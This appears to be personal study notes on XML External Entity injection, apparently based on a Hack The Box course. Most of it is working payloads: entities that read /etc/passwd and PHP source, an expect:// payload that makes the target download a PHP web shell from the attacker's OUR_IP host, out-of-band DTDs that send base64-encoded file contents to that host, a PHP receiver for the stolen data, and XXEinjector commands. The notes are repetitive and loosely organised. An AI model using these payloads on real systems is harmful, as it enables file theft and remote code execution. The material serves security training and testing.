`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions
### impact:
XXE can lead to:
1. local file inclusion
2. Remote code execution
3. can be combined with XSS to steal/hijack sessions 
#### finding XXEs
1. backend takes xml data as input
2. we should `note which elements are being displayed, such that we now which elements to inject into`.
```
4 **Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.```
# Abusing XXE 
```

 example injection point : displaying an element such as email with your user email
 ![[Pasted image 20250813152239.png]] 
For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the `email`
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

## 2.  Remote Code Execution with XXE
The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands.
1. via expect php filter

<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>

start by writing a basic PHP web shell and starting a python web server, as follows:

```shell-session
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
place the payload curl request with `$IFS`after curl, its  a shell variable for space (avoids breaking syntax with curl)
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
```
---
#### passing xml interpreters issues:
If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
##### example for a php backend:
1. `php://filter/` wrapper. 
    With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## 3. SSRF VIA XXE
which is used to enumerate locally open ports and access their pages among other restricted web pages

---
### 4. DDOS old web servers
---
## Restricted Scenarios/ dealing with other web frameworks
Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.
#### 1. Exfiltration with CDATA
To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters. 
1. define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
After that, if we reference the `&joined;` entity via  a parameter entity, it should contain our escaped data.
To bypass a limitation which denies the joining of external and internal entities, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
so lets try hosting the parameter entity
```shell-session
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### 2. Error Based XXE
If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.
let's try to send malformed XML data, and see if the web application displays any errors
just reference a non-existing entity, as follows:
![[Pasted image 20250510180231.png]]
#### RESPONSE:
 ![[Pasted image 20250510180250.png]]
 We see that we did indeed cause the web application to display an error,
	 it also revealed the web server directory `/var/www/html/error...`, which we can use to read the source code of other files.

1. host the following .dtd
   ```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

2.  Now, we can call our external DTD script, and then reference the `error` entity, as follows:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
![[Pasted image 20250510180956.png]]

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.


# out of band XXE (blind)
use xxeinjector
```shell-session
$ ruby XXEinjector.rb --host=[attacker tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```


we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.

---
we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:

```shell-session
vi index.php # here we write the above PHP code
php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Now, to initiate our attack,  simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:

```xml
<root>&content;</root>
```
![[Pasted image 20250513175144.png]]
Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content
## Automated OOB Exfiltration
 we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
 ```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```
Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
![[Pasted image 20250513181742.png]]
`--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:

```shell
	ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

# cat Logs/10.129.201.94/etc/passwd.log 
```

# XML CONCEPTS
![](Pasted%20image%2020250510025552.png)
## XML DTD

`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:

Code: xml

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

As we can see, the DTD is declaring the root `email` element with the `ELEMENT` type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by `PCDATA`)
it can be stored in an external file (e.g. `email.dtd`), and then referenced within the XML document with the `SYSTEM` keyword, as follows:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It is also possible to reference a DTD through a URL, as follows:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

This is relatively similar to how HTML documents define and reference JavaScript and CSS scripts.

# IDENTIFYING XXE
The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input.
![](Pasted%20image%2020250510024903.png)
As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target.

Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.
![](Pasted%20image%2020250510024946.png)
	We see that the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`.
# testing  for XXE
let us try to define a new entity and then use it as a variable in the `email` element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:

`adding a DTD`
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.
![](Pasted%20image%2020250510025120.png)
the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value. `This confirms that we are dealing with a web application vulnerable to XXE`.

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

## Reading Sensitive Files
add the `SYSTEM` keyword and define the external reference path after it, as we have 

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
![](Pasted%20image%2020250510025231.png)
This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server. We can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) module to see what attacks can be carried out through local file disclosure.

**Tip:** In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.
## Reading Source Code (PHP)
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
## Remote Code Execution with XXE
through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

```shell-session
 echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>

<email>&company;</email>

```
**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.
